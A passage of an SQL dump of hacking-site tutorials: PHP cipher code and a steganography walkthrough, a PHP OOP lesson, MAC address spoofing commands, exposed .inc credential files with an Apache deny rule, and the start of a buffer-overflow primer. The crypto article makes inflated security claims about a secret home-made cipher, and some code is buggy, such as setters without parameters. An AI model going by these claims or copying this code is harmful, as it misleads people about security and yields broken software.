/></div>\\n";\r\n    }\r\n?>\r\n\r\n<div class="inputArea">\r\n  <form method="post" action="">\r\n    Enter the key: <input type="text" name="key" size="20" value="<?php $_POST[''key''] ?>" /><br />\r\n    Plaintext:<br />\r\n    <textarea name="plaintext" cols="50" rows="5"><?php $_POST[''plaintext''] ?></textarea><br />\r\n    Ciphertext:<br />\r\n    <textarea name="ciphertext" cols="50" rows="5"><?php $_POST[''ciphertext''] ?></textarea><br /><br />\r\n    <input type="submit" name="encrypt" value="Encrypt" />&nbsp;&nbsp;\r\n    <input type="submit" name="decrypt" value="Decrypt" />\r\n  </form>\r\n</div>\r\n</body>\r\n</html>\r\n\r\n<?php\r\n  function encrypt($key,$text) {\r\n      $key = strtolower($key);\r\n\r\n      preptext($text,''enc'');\r\n\r\n      $key .= $text;\r\n      \r\n      $retval = '''';\r\n      for($i=0;$i<strlen($text);$i++) {\r\n          $cur_char = ord(substr($text,$i,1)) - 97;\r\n\r\n          $cur_key = ord(substr($key,$i,1)) - 97;\r\n                   \r\n          $retval .= chr(($cur_char + $cur_key)%26 + 65);\r\n      }\r\n      return $retval;\r\n  }\r\n  \r\n  function decrypt($key,$text) {\r\n      $key = strtoupper($key);\r\n      preptext($text,''dec'');\r\n      \r\n      $retval = '''';\r\n      \r\n      $i_inc = strlen($key);\r\n      $str_len = strlen($text);\r\n      $retval = '''';\r\n      for($i=0;$i<$str_len;$i = $i + $i_inc) {\r\n\r\n          $key .= strtoupper(substr($retval,($i-$i_inc),$i_inc));\r\n\r\n          for($j=0;$j<$i_inc;$j++) {\r\n              $cur_char = ord(substr($text,($i+$j),1)) - 65;\r\n              $cur_key = ord(substr($key,($i+$j),1)) - 65;\r\n              $cur_dec = $cur_char - $cur_key;\r\n\r\n              if($cur_dec > -1) {$cur_dec = $cur_dec + 97;}\r\n              else {$cur_dec = (26 + $cur_dec)+ 97;}\r\n\r\n              if(($i+$j) < $str_len) {$retval .= chr($cur_dec);}\r\n          }\r\n      }\r\n      return $retval;\r\n  }\r\n  \r\n  function preptext(&$text,$direction = ''enc'') {\r\n      $direction = strtolower($direction);\r\n\r\n      if($direction != ''enc'' && $direction != ''dec'') {\r\n          warn("preptext called with an inappropriate direction value.");\r\n      }\r\n      \r\n      switch ($direction) {\r\n          case ''enc'';\r\n              $text = strtolower($text);\r\n              $low_bound = 95;\r\n              $high_bound = 122;\r\n              break;\r\n          case ''dec'';\r\n              $text = strtoupper($text);\r\n              $low_bound = 65;\r\n              $high_bound = 90;\r\n      }\r\n\r\n      $t_len = strlen($text);\r\n      for($i=0;$i<$t_len;$i++) {\r\n          if(ord(substr($text,$i,1)) < $low_bound ||\r\n              ord(substr($text,$i,1)) > $high_bound) {\r\n              $text = substr($text,0,$i) . substr($text,($i+1));\r\n              $t_len--;\r\n          }\r\n     }\r\n }\r\n?>\r\n[/code]\r\n\r\nIn fact, it is true that the execution process will take longer than usually estimated because of the multiple dependencies we have in-between the algorithms. Also it could cause an overflow under certain circumstances but this can rarely occur unless there are some additional issues with the system that is being used to parse the algorithm. Using multiple layers for the data storage and then encrypting each one of them precisely can assure you that your data won''t be stolen or leaked. I strongly recommend that the first layer you''re encrypting should be applied Vernam cipher to.\r\n\r\nIf you manage to configure the encryption of it correctly you won''t actually need further encryption of multiple layers. Nonetheless, I have made sure that this is just a small part of what we are actually going to use to protect our data from any outside breaches. Though three layers are not actually enough, it''s still a good notion to have them. As I said before, having lots of layers requires more execution time and sometimes we may run out of memory.\r\n\r\n[h1]Creation of a Custom Encryption Algorithm[/h1]\r\nIn this part, I''m elaborating into the creation of a custom encryption algorithm which is two sided. The code is entirely mine and the algorithm is called "KDC - Keeper Data Cipher". I have not included the implementation of the key or any actual concatenation of the data and the key. It''s private as of now and I''m not willing to share the full source publicly yet. As you can see below I''m echoing a forced output. As well as that, I have also not included the reverse function that is used to decrypt the cipher text.\r\n\r\n[img]http://i.imgur.com/dR1ZAHu.png[/img]\r\n\r\nThe algorithm I designed is following the below instructions in order to work properly:\r\n\r\n[b]1. User supplied data[/b]\r\n[list]\r\n[color=#32CD32][*][/color] [color=#CC]Data[/color]\r\n[color=#32CD32][*][/color] [color=#CC]Key[/color]\r\n[/list]\r\n[b]2. Data parsing[/b]\r\n\r\n[list]\r\n[color=#32CD32][*][/color] [color=#CC]Splitting the data into three parts[/color]\r\n   [list]\r\n   [color=#FF0000][*][/color] [color=#CC]First part --> Uppercasing and replacing initial data values with variable string values[/color]\r\n   [color=#FF0000][*][/color] [color=#CC]Second part --> Lowercasing and replacing initial data values with variable symbols ranging + . |[/color]\r\n   [color=#FF0000][*][/color] [color=#CC]Third part --> Lowercasing and replacing initial data values with integer values[/color]\r\n   [/list]\r\n  [color=#32CD32][*][/color] [color=#CC]Allocating equal repetition of characters within the output[/color]\r\n   [/list]\r\n   [list]\r\n  [color=#32CD32][*][/color] [color=#CC]Concatenating the result and shifting/shuffling it x2 times randomly[/color]\r\n[/list]\r\n- Example output: [color=#E0FFFF]2yuWX+JE|SNWPIVsfBuufrKhLu.Mh+yIP|aWtNalQQ+s[/color]\r\n\r\n[b]3. Concatenation of initial data output and key[/b]\r\n\r\n[list]\r\n[color=#32CD32][*][/color] [color=#CC]Replace supplied key''s data with shuffled, equally allocated alpha-numerics + (+, ., |, /)[/color]\r\n   [list]\r\n   [color=#FF0000][*][/color] [color=#CC]Embed the result randomly within the initial output of data[/color]\r\n  [color=#FF0000][*][/color] [color=#CC]Define delimiters to locate the key[/color]\r\n  [color=#FF0000][*][/color] [color=#CC]Delimiters are being |, +, .[/color]\r\n   [/list]\r\n	   [color=#FFA500][*][/color] [color=#CC]Identifying the key[/color]\r\n[/list]\r\n[b]4. Reversing the encryption[/b]\r\n- Not included.\r\n\r\n[color=#FFDAB9]- - - [/color]\r\n\r\nSo how does the algorithm work? I have added [color=#FFA500]error_reporting(0);[/color] in order to escape unpleasant and annoying notices output by PHP stating that I have not defined some variables. Now firstly, I''ve set two variables that would take the input that is being submitted through the form. As I said, this is just the module, it does not include the proper implementation of my algorithm. That is why I declared a separate variable that would hold our plaintext. In this case [color=#9370DB]$datainput[/color] which has the assigned value of "This is a test example.".\r\n\r\nBelow, I have some other variables one of which is declared before hand so as not to get a notice, but I either ways excluded notices with the [color=#FFA500]error_reporting()[/color] function. The [color=#9370DB]$n[/color] one is holding an integer that is being used in the [color=#32CD32]while()[/color] loop below. Then I have the [color=#9370DB]$customization[/color] variable that is equal to the first six characters of the [color=#32CD32]$_POST[/color] input. Within the [color=#32CD32]while()[/color] cycle I have a basic check whether [color=#9370DB]$i[/color] is less than the submitted data, which in our case is the string "This is a test example".\r\n\r\nIf returned a boolean true, the loop is executing a concatenation between the [color=#9370DB]$customization[/color] variable and the second pair of string/integer data that is being submitted (up to 6 characters again). We are then appending the output to a new variable called [color=#9370DB]$replacement[/color] which would serve a role in the below code. Now, after the splitting of the data, I''m customizing and parsing each and every one of the three pieces through some functions. The first part of the string grabs the beginning of the string up to 6 characters and uppercases it.\r\n\r\n[img]http://i.imgur.com/dR1ZAHu.png[/img]\r\n\r\nThen I have a function that would generate a random value of a predefined length. The [color=#9370DB]$char_lists[/color] are consequently concatenating with each other to form one whole sequence of characters that are being used to generate the random output. If everything gets parsed correctly through the [color=#32CD32]for()[/color] loop, the variable [color=#9370DB]$random[/color] gets concatenated with the beginning of the string up to the 1st letter (but including it, as well). If everything is true as of statements, we get returned the value of the variable [color=#9370DB]$random[/color].\r\n\r\nAfterwards, I have included the output from the cycle outside the function, assigning a forced length of 6 characters and appended it to a variable called [color=#9370DB]$random_string[/color]. The [color=#FFA500]str_shuffle()[/color] function mixes up the output of the six characters long string. Then I have an array that contains the characters that I am going to use for the replacement. Next, is the actual replacement of them using the [color=#9370DB]$range[/color] variable to take the replacements, [color=#9370DB]$random_string2[/color] - for the shuffled ones and string where it is going to search for them.\r\n\r\nThen the first concatenation [color=#9370DB]$Concatenation1[/color] erases all white spaces with the [color=#FFA500]trim()[/color] function and takes the first five letters from the $output variable (which in our case is the final output of the replacement). Now we repeat the same process with the second and third parts of the split string. The second one is taking the letters, starting from the sixth and ending to the 13th one. Then we append the output to a variable and we achieve the same thing with the third part as well.\r\n\r\nWe merge all the strings that have been concatenated and append the value to the [color=#9370DB]$Merge[/color] variable. Then we have a function that output another random string according to a specific model. Merging several arrays that have the [color=#FFA500]range()[/color] function which contains the values from [color=#00BFFF]a-zA-Z!-)[/color], shuffle the array and get all the characters until the 13th one (as of the first example below) and up to the seventh one (as of the second example below). Then we simply echo the final result which in this case has nothing to do with the encryption.\r\n\r\n[img]http://i.imgur.com/QxWtt0B.png[/img]\r\n\r\nLet''s see what we have above. The idea is not just to use numerous algorithms that could extensively slow down the implementation of our layer but for them to have dependencies in-between themselves. We''ll leave the first layer covering the One-time Pad encryption which pretty much prevents from ever reaching this one if we have configured it correctly beforehand. Here, on the first place of the encryption of the second layer we have our custom encryption algorithm covering the first part of it since it would be the hardest to decrypt/crack (of course, after the Vernam cipher). Unless they crack it, they won''t be able to reach to the Sapphire and SAFER-SK algorithms.\r\n\r\nSo if we encrypt the following message:\r\n\r\n[code]\r\nTop secret message concealed here\r\n[/code] \r\n\r\nWe''ll get the following output for the 128 bit SAFER-SK encryption:\r\n\r\n[code]\r\n/194zMS4nS3rP7Vp+olt5dcNbHdgvA/wQAPjWPPtCHTi1w==\r\n[/code]\r\n\r\nAnd respectively the following string generated from the Sapphire II algorithm:\r\n\r\n[code]\r\nz03Lkk0L704qDHC3M0qxM6sCP0LjZ2iQDSlxJv4Cx0Fugg==\r\n[/code]\r\n\r\nBoth encryption algorithms using the key: [i][b]Kc$Hdx}\\..[/b][/i]. The idea is to mix uppercase, lowercase alpha, numeric and symbols as values for the key. In that way the charset for the brute-force attack would be larger and harder to decrypt the cipher. Though, I have not included numeric values here.\r\n\r\nIn other words, it is better to let them reach the KDC cipher but not be able to go further, than to let them reach to it after they have cracked the Sapphire and SAFER-SK encryptions (if they do actually). Either ways, they just stick at the same situation no matter how we organise our second layer encryption. Eventually, if they manage to crack through this one, we still have layer 3 which is the weakest hidden data layer from the three ones. So let''s go for it now.\r\n\r\n[h1]Steganographying the Data[/h1]\r\nSince this part is the most sensitive, we won''t spare efforts on steganographying the final data here. I''ll go through various methods of concealing the information within this layer and the ways of recovering it, pros and cons and how this could work as a scheme. The first thing I''m going to develop here is the pixel concealment. We have one basic .gif with 11 pixels as of length and 1 pixel of height. So the question is how do I embed data into that?\r\n\r\nHere is our image:\r\n\r\n[img]http://i.imgur.com/c91GyIx.jpg[/img]\r\n\r\nBasically, we won''t find anything in the source code if we view the hex values. We just get a bunch of those:\r\n\r\n[img]http://i.imgur.com/JtAcA5x.png[/img]\r\n\r\nSo the idea behind these pixels is that they are all dark blue colors. The message is concealed within the RGB values (Red, Green, Blue) in the color palette. We have a 0 assigned to the Red and Green values of the RGB and only the Blue one is used. Within it, we have the opportunity to encode or encrypt something with integers. In this case it is hex. So converting the hex values to plain ASCII gives out the message. Let''s do this now so that you may gain a better understanding of what we are talking about. So every pixel represents a single character. Obviously, the message is 11 characters long. Now let''s look into recovering the information from it.\r\n\r\nOpening it in Photoshop or any software, we take out the values of the blue color from the RGB ones. So in our case they are as follows:\r\n\r\n[code]\r\n42 61 73 69 63 20 72 69 67 68 74\r\n[/code]\r\n\r\nConverting this from the hex to plain ASCII gives us the following string:\r\n\r\n[code]\r\nBasic right\r\n[/code]\r\n\r\nOkay, that was pretty simple, yet unique method or rather way of concealing the data. Now let''s have a look at how we can use a tool that is designed to conceal the message/file using a password of our choice. Brute-forcing steganographied data is not as simple as to brute-force a simple authentication form. As well as that we can exclude the brute-forcing techniques by using a somewhat long plaintext value for our password. We''ll look at the steghide tool. I''m gonna run it under my Ubuntu but I believe you can do it under Cygwin terminal if you are under a Windows distribution.\r\n\r\n[img]http://i.imgur.com/veCjQZK.png[/img]\r\n\r\nI have those two files. One of them is the picture we are going to be concealing the image within the second one is our file. The .txt file is containing our final message. So let''s suppose we are going to place that picture in many others under some folder in the system that nobody would guess what we have there.\r\n\r\nThe sizes of them are 71.8 kB and 74 bytes respectively. That doesn''t necessarily mean that only because the size of the .txt file is smaller than the .jpg''s one, we can manipulate it freely. In this case, it does matter, yes, but there are certain cases where this is not appropriate. So first let''s see how much data, as of size, can the JPG picture hold within it as embedded.\r\n\r\n[img]http://i.imgur.com/9gkt3xE.png[/img]\r\n\r\nThe data that you are able to embed is dependent on the resolution of the picture, whether it''s with a very high contrast and the largest amount of colors possible are required. That is why .PNG files can contain a lot more data as of size within themselves. For now we see that our plain .JPG picture is 71.8 kB and we can conceal only 3.6 kB which is not even 1/5 of its size. However it is enough since our file is like bytes only (74 bytes).\r\n\r\nNow let''s get it concatenated with the image file. And define a passphrase which for the sake of this tutorial will be simply: [i][b]Kx?9@x>V'']{zL[/b][/i]\r\n\r\n[img]http://i.imgur.com/4ooHBUo.png[/img]\r\n\r\nActually, the larger the password length is, the better. Yeah, right - we all know that. But in this scenario it won''t slow down the computing time that it would take the machine in order to process the decryption or any encryption at all, simply because it has already been encrypted. Same happens if we encrypt the data within the .txt file with another encryption or a one-way algorithm from the SHA-3 family.\r\n\r\nAs well as that when we have already concatenated both files with steghide we can see the patterns of the encryption. There are multiple patterns where it is obvious that something weird is going on. For example the repetition of so many characters as in the below schemes/pictures.\r\n\r\n[img]http://i.imgur.com/9nEh9TT.png[/img]\r\n\r\nThose are the actual patterns where the file is being split in parts and is encrypted or rather obfuscated in a pretty messy way. Originally, we won''t be able to easily extract the embedded file due to the complexity of the algorithm. The best choice we would have if we were the crackers of this layer encryption, was to brute-force the passphrase which can be easily mitigated as an attack. As I said before the complexity of the password doesn''t matter here. We can type anything we want.\r\n[hr]\r\nHowever, I discourage the usage of special ALT codes because this may lead to a confusion within the algorithm of steghide or whatever software distribution you will be using. It is enough to use the English alphabet along with a bunch of symbols rather than risking the whole process, from the encryption of the first layer to the finalization part of the third layer just because of an extra precaution matter which in this case, is totally unnecessary.\r\n\r\nNow as you can see the file is 80.2 kB of data whet it was initially 71.8 kB and our .txt file was only bytes in size. That''s why I mentioned that size does matter and it is not basic additional gathering as in mathematics. We won''t have 71.8 kB + 74 bytes and result into the predicted output. So take that in mind as well. Visually, there is no difference as well as far as the picture is concerned.\r\n\r\nNow let''s look at something way more advanced here. Practically, we will be embedding a message within an audio file.\r\n\r\n[img]http://i.imgur.com/B49dasm.png[/img]\r\n\r\nFirst of all, we need to make the image that we are going to conceal within the audio file black & white colors only. This is necessary so as to be read appropriately (or read as a whole because the audio file will corrupt the message (picture) in our case and won''t be able to execute it as expected). Since there are not so many tools for *nix systems, I''ll be using one for windows platforms called Coagula. We will open the image with it as shown above. Simply and unbelievable click on File --> Open Image and choose the image that you just converted to black and white.\r\n\r\nNote that you can''t embed further data inside the picture and make a multiple layer steganographed message using audio embedding as the first layer of our encryption/concealing.\r\n\r\nNow if you play the file you will hear some strange, non-meaning signals and audio transmissions. They do practically mean nothing as of hearing them but actually have the message within them. The more our picture has identical features and line, colors etc, the more the sound output will be similar and equal. It is just reading and transmitting the image through an audio format.\r\n\r\nSo let''s decode our message using an audio spectrogram viewer such as sonic visualizer.\r\n\r\n[img]http://i.imgur.com/pJh383v.png[/img]\r\n\r\nThe image as of now is encoded into audio spectrogram, so we will add a layer of a spectrogram view so that we may actually see what we have within the transmissions. Since we already made the image to black and white we would be better off to change the color at sonic visualizer to black & white and switch the scale to linear.\r\n\r\nIn that way we get the final encoded message within our audio file which is our previously imported image.\r\n\r\n[img]http://i.imgur.com/aWd8g0R.png[/img]\r\n\r\n[h1]Analysis of the Security[/h1]\r\nInitially, my idea was to combine multiple methods in a multiple layer encryption so as to represent a scheme of only three layers that has a strongly held hierarchy under which it is functioning. I have also grabbed and explained the concept of the first layer security which is the most important in every multiple encryption of layers. I did not want to exaggerate with the encryption algorithms and ciphers because as I said before this can slow down the execution and whole implementation of the layer dependencies.\r\n\r\nHowever, as we all know there is nothing 100% secure. That is why I have left room for one 0,1% failure possibility that may occur. If the above steps are being followed you will achieve one of the highest possible security measures that could be taken against crackers. The only way someone or something to break our multiple layers of encryption is to pass through the first layer which is the Vernam cipher. Practically, impossible without having the appropriate key. So that is why there is 0,1% possibility left.\r\n\r\nImagine someone picks the key we used for the One-time Pad algorithm encryption out of full randomness. That is the 0,1%. However, as you might suppose, this is nearly impossible to happen. It does not reach to knowledge or computing power. If the Vernam cipher is combined with a polymorphic encryption, it can truly become impossible to crack but such think is not known (or at least not public - possibly used by governmental agencies or NASA/Pentagon computing processes).\r\n\r\nThe overall idea was to built up a scheme from the scratch that would be unique as of itself and in the same time combine multiple and one of the most secure methods to conceal the data. Of course, we could''ve encrypted the message inside the image which we steganographied because as I said it won''t disturb the computing process or slow it down by any chance, no overflows, no nothing. As I said, the idea was not to encrypt it that much, you can simply develop the scheme further and include that.\r\n\r\nAs stated before multiple times to escape questions I have commented a lot on my custom encryption algorithm. This is NOT the actual algorithm but rather the module it''s working under. I haven''t included the reverse function for the decryption process nor did I include the actual key implementation and punctual output of the concatenation of both, the key and the data that are being submitted.\r\n\r\n[h1]Conclusion[/h1]\r\nI went through a lot of things in this tutorial. Hopefully, my effort would be assessed and someone would actually read the whole tutorial ;) This is truly reflecting my full knowledge over cryptography and steganogprahy. There is nothing more that I could add to it.', 748, 0);
INSERT INTO `articles` (`article_id`, `title`, `slug`, `category_id`, `user_id`, `submitted`, `body`, `views`, `featured`) VALUES
(1188, 'PHP:OOP Part 5 - Property Hiding & Type Hintinting', 'phpoop-property-hiding-type-hintinting', 5, 1, FROM_UNIXTIME(1367194938), '[h1]Property Hiding[/h1]\r\nProperty hiding in PHP (or I guess in any other language which supports an object model as well) is massively used and its idea is almost absolutely self-explanatory. However, since I started my series some time ago, I''ll go through it as well. It is mainly the basis of my future tutorials from the series which would include some of the most commonly used templates in PHP. So let''s begin with our examples.\r\n\r\nLet''s take this class for instance ([color=#98FB98]Calories.php[/color]):\r\n\r\n[code]\r\n<?php\r\n\r\nclass Calories{\r\n\r\n     public $age;\r\n     public $gender;\r\n\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nSuppose the purpose of the class is to calculate the amount of calories of a person based on his age and gender (no quite original but that''s what I managed to come up with). Now these properties are public which automatically means that if we happen to have an instance of the class Calories, everyone from outside can access it. Let''s go to [color=#00BFFF]index.php[/color] where our instance is.\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''Calories.php'';\r\n$a=new Calories();\r\n$a->age=200;\r\n\r\n?>\r\n[/code]\r\n\r\nThat is just how one would go about for accessing it and inserting arbitrary data. But a worse scenario would be if the guy was to define a boolean value.\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''Calories.php'';\r\n$a=new Calories();\r\n$a->gender=true;\r\n\r\n?>\r\n[/code]\r\n\r\nWe certainly do not want that to happen as it will mess up our code immensely. So we have one property which we have to assign and subsequently to be able to use it. The idea is that if it is public, we cannot validate the data being submitted/inputted. One of the things we could do in this case is to validate that through a constructor.\r\n\r\n[code]\r\n<?php\r\n\r\nclass Calories{\r\n\r\n     public $age;\r\n     public $gender;\r\n\r\n     public function __construct() {\r\n\r\n     }\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nIt will, logically, accept a few parameters (in our case - age and gender) and to validate them within it. But suppose we want those values to be dynamically altered. Yeah we could simply make an instance but when we pass them through the constructor and make the properties as a private (or protected, depends on the situation) visibility so that they cannot be accessed from outside. But then when/if we want to assign a new value to them we would need to make a new instance of the class again which is not practical because we may have some other data that is already been used and so on.\r\n\r\nSo here comes the actual property hiding concept also known as Getters & Setters.\r\n\r\n[code]\r\n<?php\r\n\r\nclass Calories{\r\n\r\n     public $age;\r\n     public $gender;\r\n\r\n     public function __construct() {\r\n\r\n     }\r\n\r\n    \r\n     public function getAge() {\r\n          return $this->age;\r\n     }\r\n\r\n     public function setAge() {\r\n          $this->age = $age;\r\n     }\r\n\r\n     public function getGender() {\r\n          return $this->gender;\r\n     }\r\n\r\n     public function setGender() {\r\n          $this->gender = $gender;\r\n     }\r\n\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nThose are methods that grant public visibility/access over hidden properties. Now some environments and IDEs like NetBeans offer automatic writing of such methods with ALT + INSERT but it''s for laziness. Just to know it.\r\n\r\nSo we have private properties but public methods that would return it (speaking of the getters). And because of the method being in the class, we can call private properties and return them as well. But in case of setting a value, we have the method setAge() with one parameter (age) which appends that parameter to the private property.\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''Calories.php'';\r\n$a=new Calories();\r\n$a->setAge(11);\r\n\r\n?>\r\n[/code]\r\n\r\nNow in our index.php we can set the age value to let''s say 11 but we don''t have access to the actual property. So we can simply make a loop for a check that would append the value being submitted if it passes the check. So now we can indeed validate the in coming data.\r\n\r\n[code]\r\n<?php\r\n\r\nclass Calories{\r\n\r\n     private $age;\r\n     private $gender;\r\n\r\n     public function __construct() {\r\n\r\n     }\r\n\r\n    \r\n     public function getAge() {\r\n          return $this->age;\r\n     }\r\n\r\n     public function setAge() {\r\n         if($age<55) {\r\n            $this->age = $age;\r\n         }\r\n     }\r\n\r\n     public function getGender() {\r\n          return $this->gender;\r\n     }\r\n\r\n     public function setGender() {\r\n          $this->gender = $gender;\r\n     }\r\n\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nIn that way we have a private property which is in the scope of the class but it becomes publicly accessible and in those loops we can modify, check and whatever we want to validate in the data.\r\n\r\n[h1]Type Hinting[/h1]\r\nBasically speaking this is a way in which we can force a method or a function to accept a parameter of a specific type. In some cases type hinting is in fact appropriate to use. Let''s take for example, the calling of a catch block that we should specify. Technically, there is no other way to get around this without using type hinting. Because in that way we define the type of the exception. However, the massive usage of type hinting is not a good practice. Since PHP is a dynamic language, it can pretty much enable things to do whatever they want abstractly said, without the need of forcing parameters to be objects. Some of the things that are drawbacks of type hinting in PHP are:\r\n\r\n[color=#00BFFF]-[/color] [color=#FFDAB9]  It cannot be used in traits[/color]\r\n[color=#00BFFF]-[/color] [color=#FFDAB9]  Scalar data types are not supported[/color]\r\n\r\nLet''s write a simple procedural function, same mechanism as in methods. It''ll have the name of go() and will accept one parameter for example $obj. We''ll call it and make a simple var_dump just to check how things are going.\r\n\r\n[code]\r\n<?php\r\n\r\ngo(true);\r\n\r\nfunction go($obj){\r\n     var_dump($obj);\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nAs expected we get the result.\r\n\r\n[code]\r\nbool(true)\r\n[/code]\r\n\r\nIf we send a string of true we''ll get:\r\n\r\n[code]\r\nstring(4) "true"\r\n[/code]\r\n\r\nLet''s set a class which we''ll call TestClass and it won''t have any implementation. It''s gonna be just for a testing purpose so as to proof the concept of our idea about type hinting.\r\n\r\n[code]\r\n<?php\r\n\r\ngo(true);\r\n\r\nfunction go(TestClass $obj){\r\n     var_dump($obj);\r\n}\r\n\r\nclass TestClass {\r\n\r\n    function __construct() {\r\n\r\n    }\r\n\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nWith the above code we tell PHP that the function go() will accept a parameter only if it is from the type TestClass. So what we''re actually doing before the name of the parameter we define the name of the type of object. If we have more than one parameter we just normally separate it by a comma (,).\r\n\r\nSo if we execute the code like so we''ll get an error stating the following:\r\n\r\n[code]\r\nCatchable fatal error: Argument 1 passed to go() must be an instance of TestClass, string given, called in ...\r\n[/code]\r\n\r\nAn error that can be escaped with the try, catch mechanism that we''ve talked about earlier in the series. If we send a boolean value, we''ll get the same. So in order for this to work we need to send something that is from the type TestClass.\r\n\r\n[code]\r\n<?php\r\n\r\ngo(new TestClass());\r\n\r\nfunction go(TestClass $obj){\r\n     var_dump($obj);\r\n}\r\n\r\nclass TestClass {\r\n\r\n    function __construct() {\r\n\r\n    }\r\n\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nAlso it should be an object, so we can''t obviously define it as int, string or whatever data type. Type hinting works only with objects and arrays. As well as that we cannot define two types.\r\n\r\nType hinting in PHP requires you to specify types everywhere. Besides it cannot be used in traits and scalar data types are not supported as well (as I said previously in the beginning of the tutorial). If people want to learn technical terminology, they may refer to the documentation then. Apart from that, in high-level languages when we declare a variable we need to define it''s data type, when sending/receiving something as a parameter, it should be defined from what type it should be. So therefore you cannot set boolean, string, integer on a parameter if it doesn''t require it. For example something like that cannot simply be realized in C#:\r\n\r\n[code]\r\n<?php\r\n\r\ngo(''true'');\r\n\r\nfunction go($obj){\r\n  var_dump($obj);\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nThe people that use to code in high-level languages influenced PHP to create type hinting. So I don''t think that''s pretty important for object-oriented programming but it is part of it and should be treated as such. Just stating my opinion in these final lines.\r\n\r\n[h1]Conclusion[/h1]\r\nHappened to be shorter in comparison to the others. However, it is the sixth part of my series on object-oriented programming in PHP. As I said in the beginning it is a basis that you must handle before we can proceed with the templates in PHP. You can look at it as "the calm before the storm". Shorter but in the next tutorials it will feel like a piece of cake compared to what I''m planning to present. [i]Thanks for reading![/i]', 639, 0),
(1108, 'How to spoof your MAC address', 'how-to-spoof-your-mac-address', 1, 1, FROM_UNIXTIME(1353963723), '[h1]Introduction[/h1]\r\nA Media Access Control (MAC) address is essentially your computers hardware address. Much like an IP address can show where your computer is located in the world, a MAC address can be used to determine the hardware manufacturer. Spoofing basically means to trick or deceive. What you are doing when you spoof your MAC address is making people believe it has a different address than it actually does. \r\n\r\nMore information on the background and history of MAC addresses can be viewed [url=http://en.wikipedia.org/wiki/MAC_address]here[/url].\r\n\r\nIn the following examples I will show how to spoof a MAC address for Windows and Linux. \r\n\r\n[h1]How To[/h1]\r\n[h2]Windows[/h2]\r\nThe first step is to open up the registry editor. This can be done by clicking [i]start > run[/i] and then typing "regedit". Once in regedit navigate to the following key:\r\n[code]HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}[/code]\r\nScroll through the subset of this folder until you see a value that matches your network adapter stored in DriverDesc:\r\n\r\n[img]/files/media/images/articles/0/0/up_96442c67aaf4ad34170d628cc3b96a7f.jpg[/img]\r\nYou should find a value called NetworkAddress. Right click on this value and select modify. Enter a 12 digit number with no spaces. This can be whatever you would like it to be. You should enter it like this:\r\n[code]FROM_UNIXTIME(1122334455)66[/code]\r\nSometimes the NetworkAddress value does not appear in the current location. You can simply add it yourself by right clicking, and selecting [i]New > String Value[/i]. Enter [i]NetworkAddress[/i] as the name and then enter your 12 digit number.\r\n\r\nAfter this go to [i]Control Panel > Network Connections[/i] and disable and re-enable your network card.\r\n\r\n[h2]Linux[/h2]\r\nIt is much simpler to spoof your MAC address on Linux. Open a terminal window and type the following. \r\n[code]infconfig eth0 down\r\nifconfig eth0 hw ether 11:22:33:44:55:66\r\nifconfig eth0 up[/code]\r\nSubstitute eth0 with whichever interface you are trying to spoof the MAC address on. Normally wireless cards are wlan0, but to find out for sure type ifconfig and verify for yourself.', 7014, 0),
(1111, 'Inappropriate File Types', 'inappropriate-file-types', 1, 1, FROM_UNIXTIME(1353971055), 'Large amounts of sensitive data is stored on a server, these could include login credentials, source code and others. This data is generally stored in a way that is not accessible to the end user, but as all of it is required by the application to run there is an inherit danger. The application needs to make use of this data to execute correctly and therefore it must be accessible from the application. Below is one example where this data has been exposed.\r\n\r\n[h1]MySQL Credentials[/h1]\r\n[h2]Example[/h2]\r\nMySQL login files are generally stored in a separate file to the rest of the application logic, mainly for convenience. In this example the developer has opted to store the server details in a file called [i]db.inc[/i] containing the following:\r\n[code]<?php\r\n	$user = ''username'';\r\n	$pass = ''Passw0rd'';\r\n	$host = ''localhost'';\r\n	mysql_connect($host, $user, $pass) or die(mysql_error());\r\n?>[/code]\r\n\r\nWith the details above an attacker could gain access to your MySQL server and have the same privileges that your application does. Their inclusion within the source code is an obvious risk, but an unavoidable one. There is no default type set for .inc files on a Apache server so it will default to text/plain. This causes even greater concern, if the file is stored in document root, as anyone accessing the file will be able to see its entire contents in plain text. For example if the file was stored in /www/inc/db.inc then a user visiting www.example.org/inc/db.inc will be have access to the login credentials for the MySQL server.\r\n\r\n[h2]Solution[/h2]\r\nThere are a number of very simple solutions to this problem. The first and most obvious is to move the file out of the root directory. As long as the web server has read privileges on the file this should work fine. Best practice is to keep files that are not to be directly accessed via a URI out of the root directory. Every file that is with that root directory has a URL and therefore is accessible (unless configured otherwise).\r\n\r\nThe second and easier solution is to change the extension to PHP, seeing as this file contains PHP code after the file is executed the details will not be visible. Please see previous suggestion as to why, although fixing the problem is not necessarily to best idea.\r\n\r\nIf for whatever reason you are prevented from using the initial solutiont then you can configure your server to reject requests to this file. We can assume that any request to files with the extension [i]inc[/i] can be denied as they are only used in conjunction with other scripts. An example solution for Apache:\r\n[code]<Files + "\\.inc$">\r\n	Order allow,deny\r\n	Deny from all\r\n</Files>[/code]\r\n', 5645, 0),
(1120, ' Buffer Overflows and IDS Basics', 'buffer-overflows-and-ids-basics', 1, 1, FROM_UNIXTIME(1355089036), '[h2]Types of Buffer Overflows and Methods of Detection[/h2]\r\n\r\nBuffer overflows are exploits that hackers use against an operating system or application; like SQL injection attacks, theyâ€™re usually targeted at user input fields. A buffer overflow exploit causes a system to fail by overloading memory or executing a command shell or arbitrary code on the target system. A buffer overflow vulnerability is caused by a lack of bounds checking or a lack of input-validation sanitization in a variable field (such as on a web form). If the application doesnâ€™t check or validate the size or format of a variable before sending it to be stored in memory, an overflow vulnerability exits.\r\n\r\n[img]http://i.imgur.com/PEeGR.jpg[/img]\r\nThe two types of buffer overflows are stack based and heap based.\r\n\r\nThe stack and the heap are storage locations for user-supplied variables within a run-ning program. Variables are stored in the stack or heap until the program needs them. Stacks are static locations of memory address space, whereas heaps are dynamic memory address spaces that occur while a program is 